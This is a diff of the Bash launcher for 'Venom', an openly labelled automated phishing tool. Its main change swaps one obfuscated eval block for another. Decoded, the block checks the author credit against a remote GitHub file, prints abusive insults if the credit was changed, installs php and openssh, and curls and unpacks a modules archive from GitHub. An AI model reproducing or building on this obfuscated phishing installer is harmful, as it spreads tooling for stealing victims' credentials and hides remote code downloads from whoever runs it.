@@ -2,10 +2,12 @@
 
 ##   Venom 	: 	Automated Phishing Tool
 ##   Author 	: 	https://t.me/nullxvoid 
-##   Version 	: 	1.0-test
+##   Version 	: 	1.0.0
 
 # Checking Internet connection
 
+VERSION=$(cat lib/VERSION)
+AUTHOR=$(cat lib/AUTHOR)
 
 ping -c 1 google.com >/dev/null 2>&1
 if [ "$?" != '0' ]; then
@@ -15,8 +17,8 @@ fi
 
 # Requirements
 z="
-";vBz='down';YBz='inst';GBz='[ -d';HCz='ules';hBz='>&1';Qz='ead ';VBz='time';yBz='0-te';fz=' to ';ICz='.tar';eBz=' /de';NCz='2>&1';gz='khud';cz='"\e[';lBz='ps:/';TBz='ke s';Tz='[ $a';kz=' le ';ABz='slee';Uz='utho';wz=' of ';LBz='tall';ECz='tar ';xz='a bi';qBz='4You';Xz='shn ';Bz='or=$';CCz='ar.g';kBz=' htt';pBz='Anon';mBz='/git';rBz='/Ven';fBz='v/nu';IBz='odul';BCz='es.t';Wz=' AUT';XBz='apt ';qz='nage';Pz=' | h';tBz='elea';FCz='-zxf';jBz=' -LO';JCz='.gz ';dBz='-y >';uz=' you';oz='o no';ZBz='all ';vz=' son';Gz='om.s';Iz='grep';EBz=' ""';Hz='h | ';Cz='(cat';MCz='ull ';Lz='HOR=';RBz='. ma';lz='mada';GCz=' mod';az='echo';Jz=' -w ';pz='t ch';dz='31mK';CBz='exit';Zz='then';yz='tch"';UBz='ome ';FBz='fi';sz=' cre';PCz='rf m';rz=' the';LCz='ev/n';HBz=' ".M';Yz=']]; ';WBz='"';iBz='curl';bBz='open';sBz='om/r';KBz='"Ins';xBz='/v1.';OBz='equi';Mz='Alie';MBz='ig a';nBz='hub.';uBz='ses/';cBz='ssh ';ACz='st/m';hz=' se ';tz='dits';DBz='else';aBz='php ';Ez='enom';PBz='reme';Dz=' ~/V';nz='d\nD';wBz='load';QBz='nts.';Sz='if [';iz='code';OCz='rm -';Fz='/ven';Rz='-n1)';gBz='ll 2';ez='abhi';Vz='r !=';bz=' -e ';mz='rcho';jz=' kar';BBz='p 3';DCz='z';SBz='y ta';JBz='es" ';Kz='"AUT';Az='auth';Nz='nkri';oBz='com/';Oz='shn"';NBz='ll r';KCz='> /d';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$z$Sz$Tz$Uz$Vz$Wz$Lz$Mz$Nz$Xz$Yz$Zz$z$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$z$ABz$BBz$z$CBz$z$DBz$z$az$EBz$z$FBz$z$Sz$GBz$HBz$IBz$JBz$Yz$Zz$z$az$EBz$z$DBz$z$az$bz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$z$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$z$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$IBz$BCz$CCz$DCz$z$ECz$FCz$GCz$HCz$ICz$JCz$KCz$LCz$MCz$NCz$z$OCz$PCz$IBz$BCz$CCz$DCz$z$FBz"
+";dBz='php ';yBz='down';gBz='-y >';fBz='ssh ';qBz='hub.';gz='en';dz='eato';GBz='[ -d';PCz='ull ';Xz='OR)';Bz='tor=';TBz='nts.';cz=' $cr';Fz='ttps';iBz='v/nu';rBz='com/';Vz='lib/';jz='\n\e';EBz=' ""';az='UTHO';Kz='rcon';Lz='tent';vBz='om/r';xBz='ses/';JCz=' mod';qz='ode ';Sz='/hea';SCz='rf m';kz='[31;';PBz='ig a';tBz='4You';ez='r ]]';sBz='Anon';DBz='echo';mz='bhi ';mBz=' -LO';LCz='.tar';bz='R !=';Gz='://r';lBz='curl';nz='to k';ZBz='"';RCz='rm -';wz='n\e[';CCz='0-te';MCz='.gz ';NBz='"Ins';ACz='load';aBz='apt ';OBz='tall';cBz='all ';Nz='/Ano';Zz='[ $A';Mz='.com';uBz='/Ven';wBz='elea';QBz='ll r';oz='hud ';FCz='ar.g';sz='le m';SBz='reme';Yz='if [';vz='...\';eBz='open';KBz=']]; ';LBz='then';XBz='ome ';Az='crea';Rz='refs';NCz='> /d';pz='se c';Qz='nom/';hBz=' /de';HBz=' ".M';KCz='ules';Ez='sL h';Wz='AUTH';GCz='z';Dz='rl -';pBz='/git';Tz='ds/m';RBz='equi';kBz='>&1';IBz='odul';Pz='u/Ve';QCz='2>&1';Jz='buse';jBz='ll 2';MBz=' -e ';CBz='else';BBz='exit';OCz='ev/n';HCz='tar ';uz='chod';nBz=' htt';DCz='st/m';VBz='y ta';Oz='n4Yo';UBz='. ma';YBz='time';Cz='$(cu';BCz='/v1.';Iz='ithu';yz='slee';bBz='inst';oBz='ps:/';Hz='aw.g';lz='1mKa';xz='0m"';JBz='es" ';WBz='ke s';hz='prin';tz='adar';ABz='p 2';fz='; th';FBz='fi';iz='tf "';Uz='ain/';ICz='-zxf';rz='kar ';ECz='es.t';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$z$Yz$Zz$az$bz$cz$dz$ez$fz$gz$z$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$z$yz$ABz$z$BBz$z$CBz$z$DBz$EBz$z$FBz$z$Yz$GBz$HBz$IBz$JBz$KBz$LBz$z$DBz$EBz$z$CBz$z$DBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$z$aBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$z$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$IBz$ECz$FCz$GCz$z$HCz$ICz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$z$RCz$SCz$IBz$ECz$FCz$GCz$z$FBz"
 
 # Banner & Menu Don't change Author name
 main(){
@@ -31,7 +33,7 @@ echo -e "\e[31m
    ░ ░░   ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░  ░      ░
      ░░     ░      ░   ░ ░ ░ ░ ░ ▒  ░      ░   
       ░     ░  ░         ░     ░ ░         ░   
-     ░                                \e[34mVer 1.0-test\e[0m\e[32m     
+     ░                                \e[34mVer $VERSION\e[0m\e[32m     
 
 Author:${AUTHOR}
 
@@ -393,7 +395,6 @@ usr_intrp(){
   sleep 2
   exit
 }
-AUTHOR=Alienkrishn
 trap usr_intrp SIGINT
 trap usr_intrp SIGTSTP
 main
